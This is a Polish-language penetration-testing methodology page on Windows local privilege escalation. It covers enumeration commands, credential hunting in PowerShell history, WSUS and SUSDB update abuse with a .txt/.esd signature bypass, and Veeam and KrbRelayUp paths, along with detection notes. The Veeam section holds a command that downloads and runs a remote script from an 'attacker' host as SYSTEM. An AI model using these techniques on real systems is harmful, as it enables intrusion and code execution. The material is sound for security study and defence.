# Lokalna eskalacja uprawnień w systemie Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w systemie Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona łączy ogólną metodykę eskalacji uprawnień w systemie Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Przedstawiony na niej praktyczny tok enumeracji bazuje również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację DerbyCon na temat eskalacji uprawnień w systemie Windows.<sup>[[5]](#references)</sup>

Aby przejrzeć najważniejsze informacje, skorzystaj z [listy kontrolnej lokalnej eskalacji uprawnień](../checklist-windows-privilege-escalation.md).

## Podstawy systemu Windows

### Tokeny dostępu

**Jeśli nie wiesz, czym są tokeny dostępu w systemie Windows, przed dalszą lekturą zapoznaj się z następującą stroną:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na następującej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w systemie Windows, przed dalszą lekturą zapoznaj się z następującą stroną:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń systemu Windows

W systemie Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji pod kątem eskalacji uprawnień **przeczytaj** następującą **stronę** i **sprawdź** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić wykorzystanie edycji UEFI NVRAM w trybie offline do uzyskania dostępu DMA przed rozruchem i przeprowadzenia łańcucha ataku obejmującego modyfikację pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / cicha eskalacja uprawnień UIAccess

Procesy UIAccess uruchamiane przez `RAiLaunchAdminProcess` mogą zostać wykorzystane do uzyskania High IL bez monitów, jeśli zostaną ominięte kontrole bezpiecznej ścieżki AppInfo. Dedykowany proces omijania UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację rejestru dostępności Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze z uprawnieniami SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

W nowszych kompilacjach systemu Windows pojawiła się również ścieżka LPE wykorzystująca **dowolny port SMB**, w której lokalne uwierzytelnianie NTLM z wysokimi uprawnieniami jest odbijane przez ponownie używane połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

Aby przeprowadzić lokalny inwentarz w istniejącej sesji PowerShell, zobacz [Enumeracja systemu Windows z użyciem .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Te przykłady uzupełniają poniższe kontrole i nie wymagają uruchamiania osobnych plików wykonywalnych do enumeracji.

### Enumeracja informacji o wersji

Sprawdź, czy wersja systemu Windows zawiera znane luki (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity zależne od wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach firmy Microsoft. Baza zawiera ponad 4700 luk, co pokazuje **ogromną powierzchnię ataku**, jaką stwarza środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i potencjalnie pasujących biuletynach; przed uznaniem wyniku za mający zastosowanie sprawdź dokładny produkt i aktualizacje zastępujące wcześniejsze.

W przypadku lokalnego exploita zależnego od wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym systemie Windows 32-bitowy proces podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje 32-bitowy katalog systemowy, natomiast `%windir%\Sysnative` zapewnia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego lub podejrzenie braku aktualizacji KB nie dowodzi, że exploit zadziała; porównaj aktualnie uruchomioną kompilację, zainstalowaną aktualizację lub aktualizację ją zastępującą, architekturę procesu oraz wymagania exploita z [biuletynem zabezpieczeń Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnej luki.

Przykład uszkodzenia pamięci usługi znajdziesz w opisie [przesunięć w pierścieniu pamięci współdzielonej MIDI kontrolowanych przez klienta](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Opublikowane przesunięcia stosu dotyczą wyłącznie testowanej kompilacji; uzyskanie uprawnień `LOCAL SERVICE` to osobny etap od późniejszego użycia [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md), aby uzyskać `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające lub informacje Juicy?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Zapisywalny [profil PowerShell](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) to osobny trop dotyczący wykonywania kodu podczas uruchamiania; zanim uznasz go za wektor eskalacji, sprawdź, czy użytkownik z wyższymi uprawnieniami rzeczywiście ładuje ten profil.

### Pliki transkrypcji PowerShell

Dowiedz się, jak to włączyć, tutaj: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zwykle zapisują pliki w folderze Dokumenty każdego użytkownika, ale ustawienie `OutputDirectory` lub polecenie `Start-Transcript -OutputDirectory` mogą przekierować pliki do folderu współdzielonego lub ukrytego. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę zapisu i ACL pliku: transkrypcja może zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Możliwość odczytu transkrypcji jest tylko wskazówką — ma znaczenie wyłącznie wtedy, gdy jej treść ujawnia dane tożsamości o wyższych uprawnieniach, których można użyć do zalogowania się w odpowiednim kontekście.

### PowerShell Module Logging

Rejestrowane są szczegóły wykonywania potoku PowerShell, w tym uruchomione polecenia, ich wywołania oraz fragmenty skryptów. Pełne szczegóły wykonania i wyniki mogą jednak nie zostać zapisane.

Aby włączyć tę funkcję, postępuj zgodnie z instrukcjami w sekcji „Pliki transkrypcji” dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić ostatnie 15 zdarzeń z dzienników PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowane są pełna aktywność i pełna treść skryptu podczas jego wykonywania, co zapewnia dokumentację każdego bloku kodu w chwili jego uruchomienia. Proces ten pozwala zachować kompleksowy ślad audytowy każdej aktywności, przydatny w analizie kryminalistycznej i badaniu złośliwego zachowania. Dokumentowanie całej aktywności w chwili wykonania zapewnia szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowania Script Block można znaleźć w Podglądzie zdarzeń systemu Windows, w ścieżce: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operacyjne**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Wcześniejsze wskazówki podsumowywały ryzyko następująco:

Możesz przejąć kontrolę nad systemem, jeśli aktualizacje są pobierane przez http, a nie http**S**.

Punkt końcowy WSUS korzystający z HTTP to sygnał, że należy sprawdzić możliwość przechwycenia metadanych aktualizacji. Wykorzystanie tej sytuacji zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić jego ruch lub nad nim kontrolować, a także od zasad zaufania do aktualizacji i ich instalowania przez klienta. Sam adres URL nie oznacza możliwości wykonania kodu. [Microsoft zaleca stosowanie TLS w przypadku metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zacznij od sprawdzenia, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając w cmd następujące polecenie:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe polecenie w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Pierwotne stwierdzenie dotyczące możliwości wykorzystania brzmiało:

Wtedy **można wykorzystać tę podatność.** Jeśli ostatnia wartość rejestru jest równa `0`, wpis WSUS zostanie zignorowany.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla przechwytywania HTTP, ale nie dowodzi, że przechwycenie, akceptacja złośliwej aktualizacji lub jej instalacja z podwyższonymi uprawnieniami są możliwe. Gdy wartość wynosi `0`, ta konkretna usługa WSUS nie jest wybierana przez tę zasadę.

Aby wykorzystać te podatności, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — to uzbrojone skrypty MiTM do wstrzykiwania „fałszywych” aktualizacji do niezaszyfrowanego ruchu WSUS.

Zapoznaj się z badaniami:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo ta luka pozwala na wykorzystanie tego błędu:

> Jeśli możemy zmienić proxy lokalnego użytkownika, a Windows Updates używa proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod jako użytkownik z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto usługa WSUS korzysta z ustawień bieżącego użytkownika, a więc także z jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z podpisem własnym dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać ruch WSUS zarówno przez HTTP, jak i HTTPS. WSUS nie używa mechanizmów podobnych do HSTS, które umożliwiałyby walidację certyfikatu typu trust-on-first-use. Jeśli użytkownik ufa przedstawionemu certyfikatowi, a jego nazwa hosta jest poprawna, usługa go zaakceptuje.

Podatność można wykorzystać za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS kontrolowane przez administratora

Istnieje odrębna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` na serwerze oraz wszystkie delegowane uprawnienia WSUS, a następnie ustal, która grupa komputerów klienckich otrzymałaby zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [opisuje relację zaufania dotyczącą publikowania](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu do lokalnie publikowanej zawartości. Zanim uznasz to za ścieżkę eskalacji, potwierdź, że dana aktualizacja jest podpisana i akceptowana, dotyczy celu oraz zostaje zainstalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` ani nazwa grupy nie potwierdzają spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane ładunki przez `.txt`/`.esd`

Jest to odrębne naruszenie granicy zaufania, inne niż przechwytywanie połączenia HTTP WSUS: warunkiem wstępnym jest dostęp do **procedur składowanych bazy danych WSUS (`SUSDB`)** wystarczający do opublikowania i zatwierdzenia niestandardowej aktualizacji. Jedną z praktycznych ścieżek dostępu jest przekazanie konta komputera WSUS nadrzędnego serwera do oddzielnego serwera MSSQL hostującego `SUSDB`; dokładne wymagania zależą od wdrożenia, dlatego najpierw sprawdź uprawnienia `EXECUTE` zamiast zakładać, że wymagane są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o odrębnej ścieżce ataku, która przekazuje uwierzytelnianie klienta WSUS z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w sekcji [Nadużywanie WSUS HTTP do NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potwierdź przekazywanie uwierzytelniania do zewnętrznej bazy danych i uprawnienia do procedur

Wdrożenia, w których WSUS korzysta z zewnętrznego serwera SQL, należy najpierw sprawdzić pod kątem możliwości uwierzytelnienia konta serwera WSUS w bazie danych oraz tego, czy NTLM relay dociera do tego serwera. Rola SQL przypisana serwerowi może zapewniać dostęp do procedur publikowania aktualizacji, nawet jeśli bezpośrednie zapisy w tabelach są zabronione; nieudana instrukcja `UPDATE` skierowana do `SUSDB` nie dowodzi, że publikowanie jest zablokowane. Przed próbą opublikowania niestandardowej aktualizacji sprawdź efektywną tożsamość, członkostwo w rolach i uprawnienia do procedur w autoryzowanej sesji SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Bieżące definicje procedur oraz zainstalowany plik `SoftwareDistributionPackage.xsd` są przydatne przy odtwarzaniu prawidłowych metadanych aktualizacji. Zarówno nadrzędny pakiet, jak i podrzędny ładunek wymagają `UpdateIdentity` (typ fragmentu `1`), `LocalizedProperties` (`4`) oraz `ExtendedProperties` (`2`); zapisz lokalny identyfikator rewizji zwrócony przez każde wywołanie `spImportUpdate` i zachowaj spójność relacji pakietu, skrótów, rozmiaru, adresu URL zawartości oraz rewizji. Jest to stanowy proces publikowania, więc pojedyncze pomyślne wywołanie procedury składowanej nie dowodzi wykonania po stronie klienta.<sup>[[38]](#references)</sup>

#### Utwórz, skieruj i zatwierdź aktualizację

Przepływ pracy z niestandardową aktualizacją wykorzystuje legalne procedury WSUS jako ograniczone API do publikowania. Najważniejsze zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Import metadanych aktualizacji | `spImportUpdate` |
| Zapisanie fragmentów XML dotyczących wymagań wstępnych, lokalizacji i właściwości rozszerzonych | `spSaveXMLFragment` |
| Powiązanie skrótu zawartości z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyświetlenie lub utworzenie grupy komputerów i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i moduł obsługi `CommandLineInstallation` muszą być zgodne w zaimportowanych metadanych i fragmentach. Po przypisaniu adresu URL zawartości i grupy docelowej końcowe zatwierdzenie wygląda podobnie do poniższego; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia, zamiast ponownie wykorzystywać przykładowe identyfikatory GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na `false`, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` jest wtedy pomijane bez wcześniejszego sprawdzenia, czy bajty są tekstem lub prawidłowym obrazem ESD. W rezultacie niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji z wiersza poleceń aktualizacji. Jest to błąd typu pomylenie polityki i typu, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging zgodny z BITS i automatyzacja

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Serwer źródłowy musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer obejmuje początkowy przepływ `HEAD`/`GET` oraz żądania zakresów bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z komunikatem, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Badawczy PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje kod SQL wymagany dla łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do stagingu zawartości. Minimalne wywołanie w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Niewymuszone wykonanie i trwałość przez ponawianie prób

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i instalację zatwierdzonej aktualizacji zgodnie z skonfigurowanym harmonogramem, bez konieczności ręcznego wyboru przez użytkownika. Podczas testów payload, którego aktualizacja pozostawała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc ponawianie prób może stać się cykliczną formą persistence; jest to głośne, ponieważ klient pokazuje stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Punkty obserwacji i hardeningu

Przydatne punkty obserwacji po stronie serwera i klienta w ramach tego łańcucha to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; sprawdzaj nowe grupy docelowe, zewnętrzne źródła treści, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane principals (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanej nazwy `FileVerficationFailed` i `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą treści, zamiast ufać sufiksowi.
- Wyszukuj powtarzające się niepowodzenia/ponawianie instalacji Windows Update oraz wykonanie PE albo nieoczekiwaną aktywność procesów potomnych/sieciową z treści o nazwach zakończonych `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication w usłudze bazy danych i ogranicz dostęp sieciowy do bazy do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` dla procedur custom-update.

## Zewnętrzne programy aktualizujące i Agent IPC (local privesc)

Wiele agentów enterprise udostępnia interfejs IPC na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli rejestrację można wymusić na serwerze atakującego, a program aktualizujący ufa fałszywemu root CA lub stosuje słabe kontrole podpisu, użytkownik lokalny może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Oryginalny opis dotyczący konkretnej wersji i notatka z rekonesansu brzmiały:

Veeam B&R < `11.0.1.1261` udostępnia usługę localhost na **TCP/9401**, która przetwarza wiadomości kontrolowane przez atakującego, umożliwiając wykonywanie dowolnych poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: potwierdź nasłuchiwanie i wersję, np. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi backupu na **TCP/9401**. [Biuletyn Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie poświadczeń zaszyfrowanej bazy konfiguracji w obrębie sieci backupu; osobny, publiczny PoC demonstruje ścieżkę wykonywania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać na adresach innych niż localhost, dlatego sprawdź jej faktyczny adres i PID.

- **Recon**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie pełna weryfikacja poprawek.
- **Wersje z poprawką**: Veeam wskazuje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wersje z poprawką; wcześniejsze wersje są podatne. Sama czteroczęściowa wersja pliku nie pozwala odróżnić niezałatanej wersji bazowej od późniejszej poprawki dla tych samych numerów buildów. Przed uznaniem wersji granicznej za poprawioną zweryfikuj identyfikator poprawki w [historii buildów dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi DLL Veeam w tym samym katalogu, a następnie uruchom payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Usługa wykonuje polecenie jako SYSTEM.

Przytoczony PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe warunki wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.

## KrbRelayUp

Pierwotny opis domyślnego środowiska brzmiał:

W środowiskach Windows **domain** w określonych warunkach występuje podatność na **lokalne podniesienie uprawnień**. Warunki te obejmują środowiska, w których **podpisywanie LDAP nie jest wymuszane,** użytkownicy mają uprawnienia pozwalające im konfigurować **Resource-Based Constrained Delegation (RBCD)**, a także mogą tworzyć komputery w domenie. Należy pamiętać, że te **wymagania** są spełnione przy użyciu **ustawień domyślnych**.

Lokalny relay Kerberos może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM uwierzytelni się, a przekazany principal ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zarówno zapisy LDAP RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiednich uprawnień delegowania i uprawnień do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu klucza poświadczeń oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

